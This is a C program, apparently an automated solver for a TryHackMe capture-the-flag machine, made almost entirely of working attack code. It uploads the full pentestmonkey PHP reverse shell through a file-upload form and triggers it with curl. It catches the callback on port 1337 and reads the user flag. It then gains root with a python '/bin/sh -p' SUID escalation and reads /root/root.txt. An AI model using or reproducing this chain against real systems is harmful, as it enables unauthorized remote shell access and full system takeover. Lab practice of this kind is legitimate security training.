#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/wait.h>

int main(int argc, char *argv[]){
// a bit cretit to me haha..

  printf(
" _______ _           _____                     \n"
"|__   __| |         / ____|                    \n"
"   | |  | |__   ___| |  __ _ __ ___  ___ _ __  \n"
"   | |  | '_ \\ / _ \\ | |_ | '__/ _ \\/ _ \\ '_ \\ \n"
"   | |  | | | |  __/ |__| | | |  __/  __/ | | |\n"
"   |_|  |_| |_|\\___|\\_____|_|  \\___|\\___|_| |_|\n"
"                                               \n"
    );

if(argc < 2){
	printf("Usage: %s <target_ip>", argv[0]);
	return 1;
}

char *target_ip = argv[1];

int sockhndl = socket(AF_INET, SOCK_STREAM, 0);
if(sockhndl < 0){
	printf("[-] Error creating socket..\n");
	close(sockhndl);
	return 1;
}

struct sockaddr_in addr;
memset(&addr, 0, sizeof(addr));
addr.sin_family = AF_INET;
addr.sin_port = htons(80);
addr.sin_addr.s_addr = inet_addr(target_ip);

printf("[+] Checking target availability..\n");
if(connect(sockhndl, (struct sockaddr*)&addr, sizeof(addr)) < 0){
	printf("[-] Target seems to be offline..\n");
	close(sockhndl);
	return 1;
}

FILE *fptr;
printf("[+] Fetching ip from tun0 to listen..\n");
fptr = popen(
    "ifconfig tun0 2>/dev/null | grep 'inet ' | awk '{print $2}'",
    "r"
);
char tun0_ip[64] = {0};
if (fptr && fgets(tun0_ip, sizeof(tun0_ip), fptr)) {
    tun0_ip[strcspn(tun0_ip, "\n")] = 0;
    // printf("[+] IP: %s\n", tun0_ip); //for dbg..
} else {
    printf("[-] Failed to fetch tun0 ip..\n");
    close(sockhndl);
    pclose(fptr);
    return 1;
}
pclose(fptr);

char request[10000] = {0};

snprintf(request, sizeof(request),
 "POST /panel/ HTTP/1.1\r\n"
 "Host: %s\r\n"
 "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0\r\n"
 "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
 "Accept-Language: en-US,en;q=0.5\r\n"
 "Accept-Encoding: gzip, deflate, br\r\n"
 "Content-Type: multipart/form-data; boundary=----geckoformboundary3ee223bc6e12214d85bdd4fbabc4d77d\r\n"
 "Content-Length: 5838\r\n"
 "Origin: http://%s\r\n"
 "Connection: keep-alive\r\n"
 "Referer: http://%s/panel/\r\n"
 "Cookie: PHPSESSID=9qlgcjn6rq5keg4ri2aro51mf7\r\n"
 "Upgrade-Insecure-Requests: 1\r\n"
 "Priority: u=0, i\r\n"
 "\r\n"
 "------geckoformboundary3ee223bc6e12214d85bdd4fbabc4d77d\r\n"
 "Content-Disposition: form-data; name=\"fileUpload\"; filename=\"shell.php5\"\r\n"
 "Content-Type: application/x-php\r\n"
 "\r\n"
 "<?php\n"
 "// php-reverse-shell - A Reverse Shell implementation in PHP\n"
 "// Copyright (C) 2007 pentestmonkey@pentestmonkey.net\n"
 "//\n"
 "// This tool may be used for legal purposes only.  Users take full responsibility\n"
 "// for any actions performed using this tool.  The author accepts no liability\n"
 "// for damage caused by this tool.  If these terms are not acceptable to you, then\n"
 "// do not use this tool.\n"
 "//\n"
 "// In all other respects the GPL version 2 applies:\n"
 "//\n"
 "// This program is free software; you can redistribute it and/or modify\n"
 "// it under the terms of the GNU General Public License version 2 as\n"
 "// published by the Free Software Foundation.\n"
 "//\n"
 "// This program is distributed in the hope that it will be useful,\n"
 "// but WITHOUT ANY WARRANTY; without even the implied warranty of\n"
 "// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n"
 "// GNU General Public License for more details.\n"
 "//\n"
 "// You should have received a copy of the GNU General Public License along\n"
 "// with this program; if not, write to the Free Software Foundation, Inc.,\n"
 "// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.\n"
 "//\n"
 "// This tool may be used for legal purposes only.  Users take full responsibility\n"
 "// for any actions performed using this tool.  If these terms are not acceptable to\n"
 "// you, then do not use this tool.\n"
 "//\n"
 "// You are encouraged to send comments, improvements or suggestions to\n"
 "// me at pentestmonkey@pentestmonkey.net\n"
 "//\n"
 "// Description\n"
 "// -----------\n"
 "// This script will make an outbound TCP connection to a hardcoded IP and port.\n"
 "// The recipient will be given a shell running as the current user (apache normally).\n"
 "//\n"
 "// Limitations\n"
 "// -----------\n"
 "// proc_open and stream_set_blocking require PHP version 4.3+, or 5+\n"
 "// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.\n"
 "// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.\n"
 "//\n"
 "// Usage\n"
 "// -----\n"
 "// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.\n"
 "\n"
 "set_time_limit (0);\n"
 "$VERSION = \"1.0\";\n"
 "$ip = '%s';  // CHANGE THIS\n"
 "$port = 1337;       // CHANGE THIS\n"
 "$chunk_size = 1400;\n"
 "$write_a = null;\n"
 "$error_a = null;\n"
 "$shell = 'uname -a; w; id; /bin/sh -i';\n"
 "$daemon = 0;\n"
 "$debug = 0;\n"
 "\n"
 "//\n"
 "// Daemonise ourself if possible to avoid zombies later\n"
 "//\n"
 "\n"
 "// pcntl_fork is hardly ever available, but will allow us to daemonise\n"
 "// our php process and avoid zombies.  Worth a try...\n"
 "if (function_exists('pcntl_fork')) {\n"
 "	// Fork and have the parent process exit\n"
 "	$pid = pcntl_fork();\n"
 "	\n"
 "	if ($pid == -1) {\n"
 "		printit(\"ERROR: Can't fork\");\n"
 "		exit(1);\n"
 "	}\n"
 "	\n"
 "	if ($pid) {\n"
 "		exit(0);  // Parent exits\n"
 "	}\n"
 "\n"
 "	// Make the current process a session leader\n"
 "	// Will only succeed if we forked\n"
 "	if (posix_setsid() == -1) {\n"
 "		printit(\"Error: Can't setsid()\");\n"
 "		exit(1);\n"
 "	}\n"
 "\n"
 "	$daemon = 1;\n"
 "} else {\n"
 "	printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");\n"
 "}\n"
 "\n"
 "// Change to a safe directory\n"
 "chdir(\"/\");\n"
 "\n"
 "// Remove any umask we inherited\n"
 "umask(0);\n"
 "\n"
 "//\n"
 "// Do the reverse shell...\n"
 "//\n"
 "\n"
 "// Open reverse connection\n"
 "$sock = fsockopen($ip, $port, $errno, $errstr, 30);\n"
 "if (!$sock) {\n"
 "	printit(\"$errstr ($errno)\");\n"
 "	exit(1);\n"
 "}\n"
 "\n"
 "// Spawn shell process\n"
 "$descriptorspec = array(\n"
 "   0 => array(\"pipe\", \"r\"),  // stdin is a pipe that the child will read from\n"
 "   1 => array(\"pipe\", \"w\"),  // stdout is a pipe that the child will write to\n"
 "   2 => array(\"pipe\", \"w\")   // stderr is a pipe that the child will write to\n"
 ");\n"
 "\n"
 "$process = proc_open($shell, $descriptorspec, $pipes);\n"
 "\n"
 "if (!is_resource($process)) {\n"
 "	printit(\"ERROR: Can't spawn shell\");\n"
 "	exit(1);\n"
 "}\n"
 "\n"
 "// Set everything to non-blocking\n"
 "// Reason: Occsionally reads will block, even though stream_select tells us they won't\n"
 "stream_set_blocking($pipes[0], 0);\n"
 "stream_set_blocking($pipes[1], 0);\n"
 "stream_set_blocking($pipes[2], 0);\n"
 "stream_set_blocking($sock, 0);\n"
 "\n"
 "printit(\"Successfully opened reverse shell to $ip:$port\");\n"
 "\n"
 "while (1) {\n"
 "	// Check for end of TCP connection\n"
 "	if (feof($sock)) {\n"
 "		printit(\"ERROR: Shell connection terminated\");\n"
 "		break;\n"
 "	}\n"
 "\n"
 "	// Check for end of STDOUT\n"
 "	if (feof($pipes[1])) {\n"
 "		printit(\"ERROR: Shell process terminated\");\n"
 "		break;\n"
 "	}\n"
 "\n"
 "	// Wait until a command is end down $sock, or some\n"
 "	// command output is available on STDOUT or STDERR\n"
 "	$read_a = array($sock, $pipes[1], $pipes[2]);\n"
 "	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\n"
 "\n"
 "	// If we can read from the TCP socket, send\n"
 "	// data to process's STDIN\n"
 "	if (in_array($sock, $read_a)) {\n"
 "		if ($debug) printit(\"SOCK READ\");\n"
 "		$input = fread($sock, $chunk_size);\n"
 "		if ($debug) printit(\"SOCK: $input\");\n"
 "		fwrite($pipes[0], $input);\n"
 "	}\n"
 "\n"
 "	// If we can read from the process's STDOUT\n"
 "	// send data down tcp connection\n"
 "	if (in_array($pipes[1], $read_a)) {\n"
 "		if ($debug) printit(\"STDOUT READ\");\n"
 "		$input = fread($pipes[1], $chunk_size);\n"
 "		if ($debug) printit(\"STDOUT: $input\");\n"
 "		fwrite($sock, $input);\n"
 "	}\n"
 "\n"
 "	// If we can read from the process's STDERR\n"
 "	// send data down tcp connection\n"
 "	if (in_array($pipes[2], $read_a)) {\n"
 "		if ($debug) printit(\"STDERR READ\");\n"
 "		$input = fread($pipes[2], $chunk_size);\n"
 "		if ($debug) printit(\"STDERR: $input\");\n"
 "		fwrite($sock, $input);\n"
 "	}\n"
 "}\n"
 "\n"
 "fclose($sock);\n"
 "fclose($pipes[0]);\n"
 "fclose($pipes[1]);\n"
 "fclose($pipes[2]);\n"
 "proc_close($process);\n"
 "\n"
 "// Like print, but does nothing if we've daemonised ourself\n"
 "// (I can't figure out how to redirect STDOUT like a proper daemon)\n"
 "function printit ($string) {\n"
 "	if (!$daemon) {\n"
 "		print \"$string\\n\";\n"
 "	}\n"
 "}\n"
 "\n"
 "?> \n"
 "\r\n"
 "------geckoformboundary3ee223bc6e12214d85bdd4fbabc4d77d\r\n"
 "Content-Disposition: form-data; name=\"submit\"\r\n"
 "\r\n"
 "Upload\r\n"
 "------geckoformboundary3ee223bc6e12214d85bdd4fbabc4d77d--\r\n",
 target_ip, target_ip, target_ip, tun0_ip);

printf("[+] Sending request with reverse shell..\n");
send(sockhndl, request, strlen(request), 0);
close(sockhndl);

if (fork() == 0) {
    char curl_cmd[256];
    snprintf(curl_cmd, sizeof(curl_cmd), "curl -s http://%s/uploads/shell.php5 >/dev/null 2>&1 &", target_ip);
    system(curl_cmd);
    exit(0);
}
else{
wait(NULL);
int reuse = 1;
struct sockaddr_in listen_addr;
memset(&listen_addr, 0, sizeof(listen_addr));
listen_addr.sin_family = AF_INET;
listen_addr.sin_port = htons(1337);
listen_addr.sin_addr.s_addr = INADDR_ANY;
char *root_txt = NULL;

int listenerhndl = socket(AF_INET, SOCK_STREAM, 0);
if(listenerhndl < 0){
   printf("[-] Error creating listener socket..\n");
   close(listenerhndl);
   return 1;
}

setsockopt(listenerhndl, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));

printf("[+] Waiting for reverse shell connection..\n");
if(bind(listenerhndl, (struct sockaddr*)&listen_addr, sizeof(listen_addr)) < 0){
    printf("[-] Error binding to port 1337..\n");
    close(listenerhndl);
    return 1;
}

listen(listenerhndl, 1);

socklen_t s_of_l_addr = sizeof(listen_addr);
int shellhndl = accept(listenerhndl, (struct sockaddr*)&listen_addr, &s_of_l_addr);
if(shellhndl < 0){
	printf("[-] Error accepting connection..\n");
	close(listenerhndl);
	return 1;
}

 printf("[+] Reverse connection received on port 1337..\n");

char buffer[1024];
int bytes;

usleep(500000);
while(recv(shellhndl, buffer, sizeof(buffer), MSG_DONTWAIT) > 0){}
printf("       ======  Landed a shell  ======\n");
send(shellhndl, "cat /var/www/user.txt\n", 22, 0);
usleep(1000000);
bytes = recv(shellhndl, buffer, sizeof(buffer)-1, MSG_DONTWAIT);
if(bytes > 0){
    buffer[bytes] = '\0';
    char *flag = strstr(buffer, "THM{");
    if(flag){
        char *end = strchr(flag, '}');
        if(end){
            end[1] = '\0';
            printf("[+] Fetched user.txt: %s\n", flag);
        }
    }
}

printf("    ===== 💀 Getting root access 💀 =====\n");
send(shellhndl, "python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'\n", 58, 0);
usleep(2000000);

while(recv(shellhndl, buffer, sizeof(buffer), MSG_DONTWAIT) > 0){}

send(shellhndl, "whoami\n", 7, 0);
usleep(1000000);
bytes = recv(shellhndl, buffer, sizeof(buffer)-1, MSG_DONTWAIT);
buffer[bytes] = '\0';
if(strstr(buffer, "root")){
    send(shellhndl, "cat /root/root.txt\n", 20, 0);
    usleep(1000000);
    bytes = recv(shellhndl, buffer, sizeof(buffer)-1, MSG_DONTWAIT);
    if(bytes > 0){
        buffer[bytes] = '\0';
        char *flag = strstr(buffer, "THM{");
        if(flag){
            char *end = strchr(flag, '}');
            if(end){
                end[1] = '\0';
                printf("[+] Got root.txt: %s\n", flag);
                send(shellhndl, "exit\n", 5, 0);
				usleep(100000);
                close(shellhndl);
				close(listenerhndl);
				exit(0);
            }
        }
    }
}
else{
    printf("[-] Failed to be root...\n");
    close(shellhndl);
	close(listenerhndl);
	exit(0);
}

close(shellhndl);
close(listenerhndl);
}

return 0;
}
